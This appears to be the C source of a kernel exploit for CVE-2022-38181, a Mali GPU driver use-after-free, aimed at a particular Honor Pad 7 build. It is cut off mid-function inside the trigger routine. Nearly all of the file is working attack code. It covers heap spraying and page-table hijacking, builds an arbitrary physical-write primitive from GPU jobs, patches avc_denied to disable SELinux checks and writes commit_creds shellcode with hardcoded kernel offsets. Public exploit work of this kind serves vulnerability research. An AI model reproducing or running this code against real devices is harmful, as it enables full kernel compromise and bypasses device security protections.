/*
 * AGM3-specific modifications: Copyright 2026 lRENyaaa
 *
 * The AGM3-specific modifications are licensed under the Apache License,
 * Version 2.0 (the "License"); you may not use them except in compliance
 * with the License. You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * Upstream portions retain their original terms and attribution; see NOTICE.
 *
 * honor_agm3.c — CVE-2022-38181 exploit for Honor Pad 7 (AGM3-W09HN)
 *
 * Target:
 *   SoC        : MediaTek MT6769V/CU (Helio G80), Mali-G52 MC2 (Bifrost r20p0-01rel0)
 *   Kernel     : 4.14.141+ (arm64, VA_BITS=39, KASLR on but phys load fixed)
 *   Android    : 10 (Magic UI 4.0 / 11.0.2.197, SPL 2022-04-01)
 *   Locked BL  : yes — everything below runs from u:r:shell:s0 via adb
 *
 * Vuln: Arm Mali Bifrost kernel driver (r0p0..r38p1), JIT physical pages
 *       reclaimed by shrinker while GPU page tables still map them.
 *       -> freed page reused as GPU page-table page -> alias-read page tables
 *       -> overwrite PGD entry -> GPU WRITE_VALUE job = arbitrary physical write
 *       -> patch avc_denied (SELinux bypass) + sel_read_enforce (commit_creds)
 *
 * Based on:
 *   - Man Yue Mo (GitHub Security Lab) Pixel 6 PoC (aarch64)
 *   - R0rt1z2 FireTV port (MTK-era kbase ioctl layouts)
 *   - Pro-me3us Raven port
 *
 * Build:  from the repository root, run scripts/build.sh.
 * Run:    follow AGENTS.md for the mandatory TEST/write-verify/FULL order.
 *   PRESSURE_FILE=/data/local/tmp/agm3_pressure.bin /data/local/tmp/agm3_full_work 1
 *
 * TEST_MODE: exercises the trigger phase without WRITE_VALUE kernel payloads.
 *   The UAF/reclaim path itself can still corrupt state or panic the kernel.
 *   Exit code 0 + "PGD FOUND" is required before considering FULL.
 */

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/poll.h>
#include <sys/stat.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/system_properties.h>
#include <unistd.h>
#include "stdbool.h"
#include <sys/syscall.h>

#include "mali.h"
#include "mali_base_jm_kernel.h"
#include "midgard.h"

#ifdef SHELL
#define LOG(fmt, ...) do { printf(fmt, ##__VA_ARGS__); fflush(stdout); } while (0)
#else
#include <android/log.h>
#define LOG(fmt, ...) __android_log_print(ANDROID_LOG_ERROR, "agm3", fmt, ##__VA_ARGS__)
#endif

#define MALI "/dev/mali0"

#define PAGE_SHIFT 12
#undef PAGE_SIZE
#define PAGE_SIZE  0x1000

/* ---- spray parameters (1.5 GB hard cap plus a 384 MB available-memory stop) ---- */
#define SPRAY_PAGES   25
#define SPRAY_NUM     64
#define FLUSH_SIZE    (0x1000 * 0x100)  /* 1 MB per trial */
#define FLUSH_REGIONS 1500              /* ~1.5 GB worst case */
#define MIN_AVAILABLE_KB (384 * 1024)
#define SPRAY_CPU     0
#define POOL_SIZE     16384
#define RESERVED_SIZE 32
#define TOTAL_RESERVED_SIZE 1024
#define NUM_TRIALS    1500

/* ---- device ground truth (from the device's own boot.img / kallsyms) ---- */
/* kernel physical load address — Android bootimg header kernel_addr */
#define KERNEL_BASE 0x40080000ull
/* offsets of symbols inside the uncompressed kernel image (kallsyms) */
#define AVC_DENY_OFF           0x3d0588ull  /* avc_denied                */
#define SEL_READ_ENFORCE_OFF   0x3dc00cull  /* sel_read_enforce          */
#define PREPARE_KERNEL_CRED_OFF 0x5c294ull  /* prepare_kernel_cred       */
#define COMMIT_CREDS_OFF       0x5bee0ull   /* commit_creds              */

/* PGD entry index we overwrite (entry #256 -> GPU VA with low L-index 0x100) */
#define OVERWRITE_INDEX 256

/* avc_denied patch:  movz w0, #0 ; ret  -> every AVC denial becomes "allowed"
 * (CONFIG_SECURITY_SELINUX_DEVELOP=n on this kernel, so there is no
 *  selinux_enforcing global to flip — this is the robust equivalent). */
static uint32_t avc_patch[2] = { 0x52800000, 0xD65F03C0 };

/* root shellcode, generated at runtime (11 instructions, 44 bytes):
 *   stp x29,x30,[sp,#-16]! ; mov x29,sp
 *   mov x0, xzr
 *   adrp x8, prepare_kernel_cred ; add x8,x8,#lo ; blr x8
 *   adrp x8, commit_creds        ; add x8,x8,#lo ; blr x8
 *   ldp x29,x30,[sp],#16 ; ret
 * runs in the context of whoever reads /sys/fs/selinux/enforce (= us). */
static uint32_t root_code[11] = { 0 };

static uint8_t  jit_id = 1;
static uint8_t  atom_number = 1;
static uint64_t gpu_va[SPRAY_NUM] = { 0 };          /* GPU VAs of spray regions   */
static uint8_t *cpu_regions[SPRAY_NUM] = { 0 };      /* CPU mappings of the same   */
static uint8_t *alias_regions[SPRAY_NUM] = { 0 };    /* CPU mappings of alias view */
static void    *flush_regions[FLUSH_REGIONS];
static uint64_t reserved[TOTAL_RESERVED_SIZE / RESERVED_SIZE];
static int      flush_idx = 0;
static uint64_t g_pgd;               /* GPU address of hijacked PGD entry page */
static int      g_pgd_slot;
static int      g_pgd_page;

struct base_mem_handle {
    struct { __u64 handle; } basep;
};
struct base_mem_aliasing_info {
    struct base_mem_handle handle;
    __u64 offset;
    __u64 length;
};

static int open_dev(const char *name)
{
    int fd = open(name, O_RDWR);
    if (fd == -1)
        err(1, "cannot open %s", name);
    return fd;
}

static void setup_mali(int fd)
{
    struct kbase_ioctl_version_check param = { 0 };
    if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &param) < 0)
        err(1, "version check failed");
    LOG("[?] kbase UAPI version: %d.%d\n", param.major, param.minor);

    /* Keep MMU and allocation groups at 0 so both use the same global pool. */
    struct kbase_ioctl_set_flags set_flags = { 0 };
    if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &set_flags) < 0)
        err(1, "set flags failed");
}

static void *setup_tracking_page(int fd)
{
    void *region = mmap(NULL, PAGE_SIZE, 0, MAP_SHARED, fd,
                        (off_t)BASE_MEM_MAP_TRACKING_HANDLE);
    if (region == MAP_FAILED)
        err(1, "setup tracking page failed");
    return region;
}

static void jit_init(int fd, uint64_t va_pages)
{
    struct kbase_ioctl_mem_jit_init init = { 0 };
    init.va_pages = va_pages;
    init.max_allocations = 255;
    init.trim_level = 100;
    if (ioctl(fd, KBASE_IOCTL_MEM_JIT_INIT, &init) < 0)
        err(1, "jit_init failed");
    LOG("[+] jit_init ok (11.17 shape)\n");
}

static uint64_t jit_allocate(int fd, uint8_t atom_number, uint8_t id,
                             uint64_t va_pages, uint64_t gpu_alloc_addr,
                             uint64_t *out_ptr)
{
    struct base_jit_alloc_info info = { 0 };
    struct base_jd_atom_v2 atom = { 0 };

    info.id = id;
    info.gpu_alloc_addr = gpu_alloc_addr;
    info.va_pages = va_pages;
    info.commit_pages = va_pages;
    info.extension = 0x1000;

    atom.jc = (uint64_t)&info;
    atom.atom_number = atom_number;
    atom.core_req = BASE_JD_REQ_SOFT_JIT_ALLOC;
    atom.nr_extres = 1;
    struct kbase_ioctl_job_submit submit = { 0 };
    submit.addr = (uint64_t)&atom;
    submit.nr_atoms = 1;
    submit.stride = sizeof(struct base_jd_atom_v2);
    if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0)
        err(1, "submit jit alloc job failed");

    for (int i = 0; i < 2000; i++) {
        uint64_t v = __atomic_load_n(out_ptr, __ATOMIC_ACQUIRE);
        if (v != 0)
            return v;
        usleep(1000);
    }
    return 0;
}

static void jit_free(int fd, uint8_t atom_number, uint8_t id)
{
    uint8_t free_id = id;
    struct base_jd_atom_v2 atom = { 0 };
    atom.jc = (uint64_t)&free_id;
    atom.atom_number = atom_number;
    atom.core_req = BASE_JD_REQ_SOFT_JIT_FREE;
    atom.nr_extres = 1;
    struct kbase_ioctl_job_submit submit = { 0 };
    submit.addr = (uint64_t)&atom;
    submit.nr_atoms = 1;
    submit.stride = sizeof(struct base_jd_atom_v2);
    if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0)
        err(1, "submit jit free job failed");
}

struct jd_event {
    int32_t code;
    uint8_t nr;
    uint8_t pad[3];
    uint64_t udata[2];
};
_Static_assert(sizeof(struct jd_event) == 24, "event 24");

static int wait_softjob_event(int fd, uint8_t expected_atom)
{
    for (int attempt = 0; attempt < 3; attempt++) {
        struct pollfd pfd = { .fd = fd, .events = POLLIN };
        int prc = poll(&pfd, 1, 2000);
        if (prc <= 0) {
            LOG("[-] softjob event poll failed: rc=%d errno=%d revents=%x\n",
                prc, errno, pfd.revents);
            return -2;
        }
        struct jd_event events[16];
        ssize_t n = read(fd, events, sizeof(events));
        if (n <= 0) {
            LOG("[-] softjob event read failed: n=%zd errno=%d\n", n, errno);
            return -2;
        }
        int count = (int)(n / sizeof(events[0]));
        for (int i = 0; i < count; i++) {
            LOG("[event] atom#%u code=%d(0x%x)\n", events[i].nr,
                events[i].code, (unsigned)events[i].code);
            if (events[i].nr == expected_atom)
                return events[i].code == BASE_JD_EVENT_DONE ? 0 : -1;
        }
    }
    LOG("[-] target softjob event was not received\n");
    return -2;
}

static void mem_flags_change(int fd, uint64_t gpu_addr, uint32_t flags)
{
    struct kbase_ioctl_mem_flags_change change = { 0 };
    change.flags = flags;
    change.gpu_va = gpu_addr;
    change.mask = flags;
    if (ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &change) < 0)
        err(1, "flags_change failed");
}

static void mem_alloc(int fd, union kbase_ioctl_mem_alloc *alloc)
{
    if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, alloc) < 0)
        err(1, "mem_alloc failed");
}

static void mem_alias(int fd, union kbase_ioctl_mem_alias *alias)
{
    if (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, alias) < 0)
        err(1, "mem_alias failed");
}

static void mem_commit(int fd, uint64_t gpu_addr, uint64_t pages)
{
    struct kbase_ioctl_mem_commit commit = { .gpu_addr = gpu_addr, .pages = pages };
    if (ioctl(fd, KBASE_IOCTL_MEM_COMMIT, &commit) < 0)
        err(1, "mem_commit failed gpu=%llx", (unsigned long long)gpu_addr);
}

static void *map_gpu(int mali_fd, unsigned int va_pages, unsigned int commit_pages,
                     bool read_only, uint64_t *gpu_va_out)
{
    union kbase_ioctl_mem_alloc alloc = { 0 };
    alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR;
    int prot = PROT_READ;
    if (!read_only) {
        alloc.in.flags |= BASE_MEM_PROT_GPU_WR;
        prot |= PROT_WRITE;
    }
    alloc.in.va_pages = va_pages;
    alloc.in.commit_pages = commit_pages;
    mem_alloc(mali_fd, &alloc);
    void *region = mmap(NULL, (size_t)PAGE_SIZE * va_pages, prot, MAP_SHARED,
                        mali_fd, (off_t)alloc.out.gpu_va);
    if (region == MAP_FAILED)
        err(1, "mmap gpu region failed");
    if (gpu_va_out)
        *gpu_va_out = (uint64_t)region;
    return region;
}

static void *drain_mem_pool(int mali_fd)
{
    union kbase_ioctl_mem_alloc alloc = { 0 };
    alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
                     BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
    alloc.in.va_pages = POOL_SIZE;
    alloc.in.commit_pages = POOL_SIZE;
    mem_alloc(mali_fd, &alloc);
    void *region = mmap(NULL, (size_t)POOL_SIZE * PAGE_SIZE,
                        PROT_READ | PROT_WRITE, MAP_SHARED, mali_fd,
                        (off_t)alloc.out.gpu_va);
    if (region == MAP_FAILED)
        err(1, "drain mmap failed");
    return region;
}

static void release_mem_pool(int mali_fd, void *drain)
{
    (void)mali_fd;
    if (munmap(drain, (size_t)POOL_SIZE * PAGE_SIZE) < 0)
        err(1, "release_mem_pool (munmap) failed");
}

static uint64_t drain_mem_pool_pending(int mali_fd)
{
    union kbase_ioctl_mem_alloc alloc = { 0 };
    alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
                     BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
    alloc.in.va_pages = POOL_SIZE;
    alloc.in.commit_pages = POOL_SIZE;
    mem_alloc(mali_fd, &alloc);
    return alloc.out.gpu_va;
}

static void release_mem_pool_pending(int mali_fd, uint64_t drain)
{
    struct kbase_ioctl_mem_free mem_free = { .gpu_addr = drain };
    if (ioctl(mali_fd, KBASE_IOCTL_MEM_FREE, &mem_free) < 0)
        err(1, "release_mem_pool_pending failed");
}

/* ---- CPU affinity: distribute replacement spray across all cores ---- */
#define CPU_SETSIZE 1024
#define __NCPUBITS  (8 * sizeof(unsigned long))
typedef struct { unsigned long __bits[CPU_SETSIZE / __NCPUBITS]; } cpu_set_t;
#define CPU_SET(cpu, cpusetp) \
    ((cpusetp)->__bits[(cpu) / __NCPUBITS] |= (1UL << ((cpu) % __NCPUBITS)))
#define CPU_ZERO(cpusetp) memset((cpusetp), 0, sizeof(cpu_set_t))

static int migrate_to_cpu(int i)
{
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(i, &cpu);
    return syscall(__NR_sched_setaffinity, gettid(), sizeof(cpu), &cpu);
}

static void *do_flush(int idx)
{
    void *region = mmap(NULL, FLUSH_SIZE, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (region == MAP_FAILED)
        err(1, "flush mmap failed");
    memset(region, idx & 0xff, FLUSH_SIZE);
    return region;
}

static long mem_available_kb(void)
{
    FILE *fp = fopen("/proc/meminfo", "r");
    if (!fp)
        return -1;
    char line[256];
    long value = -1;
    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "MemAvailable: %ld kB", &value) == 1)
            break;
    }
    fclose(fp);
    return value;
}

static volatile uint64_t file_pressure_checksum;

static int prime_file_lru(const char *path)
{
    enum { PRIME_STEPS = 96, PRIME_STEP_MB = 16 };
    const size_t step_size = (size_t)PRIME_STEP_MB << 20;
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        LOG("[-] open PRESSURE_FILE failed: errno=%d\n", errno);
        return -1;
    }
    off_t file_size = lseek(fd, 0, SEEK_END);
    off_t required = (off_t)PRIME_STEPS * (off_t)step_size;
    if (file_size < required) {
        LOG("[-] PRESSURE_FILE too small: %lld < %lld\n",
            (long long)file_size, (long long)required);
        close(fd);
        return -1;
    }
    for (int i = 0; i < PRIME_STEPS; i++) {
        volatile uint8_t *pages = mmap(NULL, step_size, PROT_READ, MAP_SHARED,
                                       fd, (off_t)i * (off_t)step_size);
        if (pages == MAP_FAILED) {
            LOG("[-] file prime mmap failed at %dMB: errno=%d\n",
                (i + 1) * PRIME_STEP_MB, errno);
            close(fd);
            return -1;
        }
        uint64_t sum = 0;
        for (size_t j = 0; j < step_size; j += PAGE_SIZE)
            sum += pages[j];
        file_pressure_checksum ^= sum;
        munmap((void *)pages, step_size);
        if ((i + 1) % 16 == 0)
            LOG("[*] primed=%dMB available=%ldkB\n",
                (i + 1) * PRIME_STEP_MB, mem_available_kb());
    }
    close(fd);
    return 0;
}

static void free_flush_regions(void)
{
    for (int r = 0; r < flush_idx; r++)
        if (flush_regions[r]) {
            munmap(flush_regions[r], FLUSH_SIZE);
            flush_regions[r] = NULL;
        }
    flush_idx = 0;
}

typedef struct {
    int mali_fd;
    int cpu;
    int first;
} spray_task;

static void *spray_worker(void *arg)
{
    spray_task *task = arg;
    if (migrate_to_cpu(task->cpu) != 0)
        return (void *)-1;
    uint64_t cookies[8] = { 0 };
    for (int k = 0; k < 8; k++) {
        union kbase_ioctl_mem_alloc alloc = { 0 };
        alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
                         BASE_MEM_PROT_CPU_WR;
        alloc.in.va_pages = SPRAY_PAGES;
        alloc.in.commit_pages = 0;
        if (ioctl(task->mali_fd, KBASE_IOCTL_MEM_ALLOC, &alloc) < 0)
            return (void *)-1;
        cookies[k] = alloc.out.gpu_va;
    }
    for (int k = 0; k < 8; k++) {
        int j = task->first + k;
        void *region = mmap(NULL, (size_t)PAGE_SIZE * SPRAY_PAGES,
                            PROT_READ | PROT_WRITE, MAP_SHARED, task->mali_fd,
                            (off_t)cookies[k]);
        if (region == MAP_FAILED)
            return (void *)-1;
        cpu_regions[j] = region;
        gpu_va[j] = (uint64_t)region;
    }
    return NULL;
}

static void spray(int mali_fd)
{
    for (int base_cpu = 0; base_cpu < 8; base_cpu += 4) {
        pthread_t threads[4];
        spray_task tasks[4];
        for (int i = 0; i < 4; i++) {
            tasks[i].mali_fd = mali_fd;
            tasks[i].cpu = base_cpu + i;
            tasks[i].first = tasks[i].cpu * 8;
            if (pthread_create(&threads[i], NULL, spray_worker, &tasks[i]) != 0)
                err(1, "spray pthread_create");
        }
        for (int i = 0; i < 4; i++) {
            void *result = NULL;
            if (pthread_join(threads[i], &result) != 0 || result != NULL)
                err(1, "spray worker failed on CPU%d", tasks[i].cpu);
        }
    }
    for (int j = 0; j < SPRAY_NUM; j++)
        mem_commit(mali_fd, gpu_va[j], SPRAY_PAGES);
}

static uint8_t *alias_full;

static void unmap_spray(void)
{
    if (alias_full) {
        munmap(alias_full, (size_t)PAGE_SIZE * SPRAY_NUM * SPRAY_PAGES);
        alias_full = NULL;
        alias_regions[0] = NULL;
    }
    for (int j = 0; j < SPRAY_NUM; j++) {
        if (cpu_regions[j]) { munmap(cpu_regions[j], (size_t)PAGE_SIZE * SPRAY_PAGES); cpu_regions[j] = NULL; }
        if (j > 0 && alias_regions[j]) { munmap(alias_regions[j], (size_t)PAGE_SIZE * SPRAY_PAGES); alias_regions[j] = NULL; }
        gpu_va[j] = 0;
    }
}

/* create an alias mapping over all spray regions so that the *page tables*
 * backing them become readable data through one of the alias views */
static uint64_t alias_sprayed_regions(int mali_fd)
{
    union kbase_ioctl_mem_alias alias = { 0 };
    alias.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
                     BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
    alias.in.stride = SPRAY_PAGES;
    alias.in.nents = SPRAY_NUM;

    struct base_mem_aliasing_info ai[SPRAY_NUM];
    for (int i = 0; i < SPRAY_NUM; i++) {
        ai[i].handle.basep.handle = gpu_va[i];
        ai[i].length = SPRAY_PAGES;
        ai[i].offset = 0;
    }
    alias.in.aliasing_info = (uint64_t)&ai[0];
    mem_alias(mali_fd, &alias);

    size_t region_size = (size_t)PAGE_SIZE * SPRAY_NUM * SPRAY_PAGES;
    void *region = mmap(NULL, region_size, PROT_READ, MAP_SHARED,
                        mali_fd, (off_t)alias.out.gpu_va);
    if (region == MAP_FAILED)
        err(1, "alias full mmap failed");
    alias_full = region;
    alias_regions[0] = region;
    for (int i = 1; i < SPRAY_NUM; i++) {
        void *r = mmap(NULL, (size_t)PAGE_SIZE * SPRAY_PAGES, PROT_READ,
                       MAP_SHARED, mali_fd,
                       (off_t)((uint64_t)region + (uint64_t)i * PAGE_SIZE * SPRAY_PAGES));
        if (r == MAP_FAILED)
            err(1, "alias mmap failed %d", i);
        alias_regions[i] = r;
    }
    return (uint64_t)region;
}

static void fault_pages(void)
{
    int read = 0;
    for (int va = 0; va < SPRAY_NUM; va++) {
        cpu_regions[va][0] = 0;              /* fault in real pages        */
        read += alias_regions[va][0];        /* fault via alias view       */
    }
    LOG("[*] fault_pages read=%d\n", read);
}

static uint64_t g_pgd_orig;

static int find_pgd(int mali_fd, int *freed_idx)
{
    for (int j = 0; j < SPRAY_NUM; j++) {
        union kbase_ioctl_mem_query query = { 0 };
        query.in.gpu_addr = gpu_va[j];
        query.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
        int qrc = ioctl(mali_fd, KBASE_IOCTL_MEM_QUERY, &query);
        if (qrc == 0 && query.out.value == SPRAY_PAGES)
            continue;
        if (qrc < 0)
            LOG("[*] slot %d: query failed, checking alias\n", j);
        else
            LOG("[*] slot %d: commit changed to %llu, checking alias\n", j,
                (unsigned long long)query.out.value);

        uint64_t *view = (uint64_t *)alias_regions[j];
        for (int pg = 0; pg < SPRAY_PAGES; pg++) {
            int hits = 0;
            for (int i = 0; i < PAGE_SIZE / 8; i++) {
                uint64_t entry = view[pg * (PAGE_SIZE / 8) + i];
                if ((entry & 0x443) == 0x443)
                    hits++;
            }
            size_t overwrite_pos = pg * (PAGE_SIZE / 8) + OVERWRITE_INDEX;
            if (hits > 0)
                LOG("[diag] slot %d page %d hits=%d entry256=%llx\n",
                    j, pg, hits, (unsigned long long)view[overwrite_pos]);
            if (hits >= 1 &&
                (view[overwrite_pos] == 0 || view[overwrite_pos] == 2)) {
                g_pgd_orig = view[overwrite_pos];
                *freed_idx = j;
                LOG("[+] candidate slot %d page %d (%d pte-like entries)\n",
                    j, pg, hits);
                return pg;
            }
        }
    }
    return -1;
}

/* ---- aarch64 instruction builders ---- */
static uint32_t write_adrp(int rd, uint64_t pc_off, uint64_t label_off)
{
    uint64_t pc_page = pc_off >> 12;
    uint64_t label_page = label_off >> 12;
    int64_t offset = (int64_t)(label_page - pc_page) << 12;
    int64_t immhi = offset >> 14;
    int32_t immlo = (int32_t)((offset >> 12) & 0x3);
    uint32_t adpr = (uint32_t)(rd & 0x1f);
    adpr |= (1u << 28);
    adpr |= (1u << 31);            /* op = ADRP */
    adpr |= (uint32_t)immlo << 29;
    adpr |= 0xffffe0 & (uint32_t)(immhi << 5);
    return adpr;
}

#define ADD_OPCODE_ARM64 0x91000000
static uint32_t add_off_to_reg(uint32_t offset, uint8_t reg)
{
    uint32_t add_value = ADD_OPCODE_ARM64;
    add_value |= reg;                       /* Rd */
    add_value |= (uint32_t)reg << 5;        /* Rn */
    add_value |= (offset & 0xFFF) << 10;    /* imm12 */
    return add_value;
}

static void build_root_code(void)
{
    root_code[0] = 0xA9BF7BFD;  /* stp x29, x30, [sp, #-16]! */
    root_code[1] = 0x910003FD;  /* mov x29, sp               */
    root_code[2] = 0xAA1F03E0;  /* mov x0, xzr               */
    root_code[3] = write_adrp(8, SEL_READ_ENFORCE_OFF, PREPARE_KERNEL_CRED_OFF);
    root_code[4] = add_off_to_reg(PREPARE_KERNEL_CRED_OFF & 0xFFF, 8);
    root_code[5] = 0xD63F0100;  /* blr x8  -> prepare_kernel_cred(0) */
    root_code[6] = write_adrp(8, SEL_READ_ENFORCE_OFF, COMMIT_CREDS_OFF);
    root_code[7] = add_off_to_reg(COMMIT_CREDS_OFF & 0xFFF, 8);
    root_code[8] = 0xD63F0100;  /* blr x8  -> commit_creds(x0)       */
    root_code[9] = 0xA8C17BFD;  /* ldp x29, x30, [sp], #16           */
    root_code[10] = 0xD65F03C0; /* ret                                */
}

/* ---- GPU WRITE_VALUE job = arbitrary physical write primitive ---- */
static void write_to(int mali_fd, uint64_t gpu_addr, uint64_t value, int atom_number,
                     enum mali_write_value_type type)
{
    uint64_t jc_gpu = 0;
    void *jc_region = map_gpu(mali_fd, 1, 1, false, &jc_gpu);
    struct MALI_JOB_HEADER jh = { 0 };
    jh.is_64b = true;
    jh.type = MALI_JOB_TYPE_WRITE_VALUE;

    struct MALI_WRITE_VALUE_JOB_PAYLOAD payload = { 0 };
    payload.type = type;
    payload.immediate_value = value;
    payload.address = gpu_addr;

    uint32_t *section = (uint32_t *)jc_region;
    MALI_JOB_HEADER_pack(section, &jh);
    MALI_WRITE_VALUE_JOB_PAYLOAD_pack(section + 8, &payload);

    struct base_jd_atom_v2 atom = { 0 };
    atom.jc = (uint64_t)jc_region;
    atom.atom_number = atom_number;
    atom.core_req = BASE_JD_REQ_CS;
    struct kbase_ioctl_job_submit submit = { 0 };
    submit.addr = (uint64_t)&atom;
    submit.nr_atoms = 1;
    submit.stride = sizeof(struct base_jd_atom_v2);
    if (ioctl(mali_fd, KBASE_IOCTL_JOB_SUBMIT, &submit) < 0)
        err(1, "write job submit failed");
    usleep(10000);
}

/* GPU VA whose page-table walk lands on the kernel phys page we hijacked */
static uint64_t set_addr_lv3(uint64_t addr)
{
    uint64_t pfn = addr >> PAGE_SHIFT;
    pfn &= ~0x1FFUL;
    pfn |= 0x100UL;
    return pfn << PAGE_SHIFT;
}

static inline uint64_t compute_pt_index(uint64_t addr, int level)
{
    uint64_t vpfn = addr >> PAGE_SHIFT;
    vpfn >>= (3 - level) * 9;
    return vpfn & 0x1FF;
}

/* write shellcode over `func` by walking every page-table slot of the
 * reserved GPU regions (one of them contains the kernel page) */
static void write_func(int mali_fd, uint64_t func_off, uint64_t *reserved_va,
                       uint64_t nres, uint32_t *shellcode, uint64_t code_size)
{
    uint64_t func_page_off = (func_off + KERNEL_BASE) % PAGE_SIZE;
    uint64_t curr = 0;
    for (uint64_t i = 0; i < nres; i++) {
        uint64_t base = reserved_va[i];
        uint64_t end  = reserved_va[i] + RESERVED_SIZE * PAGE_SIZE;
        for (uint64_t addr = base; addr < end; addr += PAGE_SIZE) {
            uint64_t overwrite_addr = set_addr_lv3(addr);
            if (curr != overwrite_addr) {
                LOG("[*] overwrite %llx + %llx\n",
                    (unsigned long long)(overwrite_addr + func_page_off),
                    (unsigned long long)func_page_off);
                curr = overwrite_addr;
                for (int64_t code = (int64_t)code_size - 1; code >= 0; code--)
                    write_to(mali_fd,
                             overwrite_addr + func_page_off + (uint64_t)code * 4,
                             shellcode[code], atom_number++,
                             MALI_WRITE_VALUE_TYPE_IMMEDIATE_32);
                usleep(300000);
            }
        }
    }
}

static void reserve_pages(int mali_fd, int pages, int nents)
{
    for (int i = 0; i < nents; i++) {
        union kbase_ioctl_mem_alloc alloc = { 0 };
        alloc.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD |
                         BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
        alloc.in.va_pages = pages;
        alloc.in.commit_pages = pages;
        mem_alloc(mali_fd, &alloc);
        reserved[i] = alloc.out.gpu_va;
    }
}

static void map_reserved(int mali_fd, int pages, int nents)
{
    for (int i = 0; i < nents; i++) {
        void *r = mmap(NULL, (size_t)PAGE_SIZE * pages, PROT_READ | PROT_WRITE,
                       MAP_SHARED, mali_fd, (off_t)reserved[i]);
        if (r == MAP_FAILED)
            err(1, "mmap reserved failed");
        reserved[i] = (uint64_t)r;
    }
}

static void write_shellcode(int mali_fd, int mali_fd2, uint64_t pgd)
{
    /* 1) point hijacked PGD entry at avc_denied's physical page */
    uint64_t avc_page = (((AVC_DENY_OFF + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT) | 0x443;
    write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), avc_page,
             atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
    usleep(100000);

    /* 2) overwrite avc_denied -> SELinux denials return "allowed" */
    write_func(mali_fd2, AVC_DENY_OFF, reserved,
               TOTAL_RESERVED_SIZE / RESERVED_SIZE, avc_patch, 2);

    /* 3) trigger: any AVC denial now reaches avc_denied (patched) */
    open("/dev/kmsg", O_RDONLY);

    /* 4) point hijacked PGD entry at sel_read_enforce's physical page */
    uint64_t sre_page = (((SEL_READ_ENFORCE_OFF + KERNEL_BASE) >> PAGE_SHIFT) << PAGE_SHIFT) | 0x443;
    write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), sre_page,
             atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);

    /* 5) overwrite sel_read_enforce -> commit_creds(prepare_kernel_cred(0)) */
    write_func(mali_fd2, SEL_READ_ENFORCE_OFF, reserved,
               TOTAL_RESERVED_SIZE / RESERVED_SIZE, root_code, 11);
}

static void cleanup_pgd(int mali_fd, uint64_t pgd)
{
    write_to(mali_fd, pgd + OVERWRITE_INDEX * sizeof(uint64_t), g_pgd_orig,
             atom_number++, MALI_WRITE_VALUE_TYPE_IMMEDIATE_64);
    usleep(100000);
}

static int wait_region_gone(int mali_fd, uint64_t gpu_addr)
{
    for (int i = 0; i < 200; i++) {
        union kbase_ioctl_mem_query query = { 0 };
        query.in.gpu_addr = gpu_addr;
        query.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
        if (ioctl(mali_fd, KBASE_IOCTL_MEM_QUERY, &query) < 0)
            return 0;
        usleep(10000);
    }
    return -1;
}

static int wait_spray_released(int mali_fd)
{
    for (int i = 0; i < 20; i++) {
        for (int j = 0; j < SPRAY_NUM; j++) {
            union kbase_ioctl_mem_query query = { 0 };
            query.in.gpu_addr = gpu_va[j];
            query.in.query = KBASE_MEM_QUERY_COMMIT_SIZE;
            int qrc = ioctl(mali_fd, KBASE_IOCTL_MEM_QUERY, &query);
            if (qrc < 0) {
                LOG("[-] post-free slot %d disappeared unexpectedly\n", j);
                return -2;
            }
            if (i == 0 && query.out.value != SPRAY_PAGES)
                LOG("[diag] post-free slot %d commit=%llu\n", j,
                    (unsigned long long)query.out.value);
            if (query.out.value == 0) {
                LOG("[+] replacement backing released in slot %d\n", j);
                return j;
            }
        }
        usleep(10000);
    }
    return -1;
}

static int trigger(int mali_fd, int mali_fd2)
{
    if (flush_idx + NUM_TRIALS > FLUSH_REGIONS)
        err(1, "out of flush budget");

    /* JIT info buffer: kernel soft-job writes the allocated JIT GPU
     * address into its first 8 bytes */
    uint64_t info_gpu = 0;
    uint8_t *info_cpu = (uint8_t *)map_gpu(mali_fd, 1, 1, false, &info_gpu);
    memset(info_cpu, 0, 16);   /* kill stale pool-page content */
    LOG("[*] info buffer gpu %llx\n", (unsigned long long)info_gpu);
    uint64_t jit_addr = jit_allocate(mali_fd, atom_number, jit_id, SPRAY_PAGES,
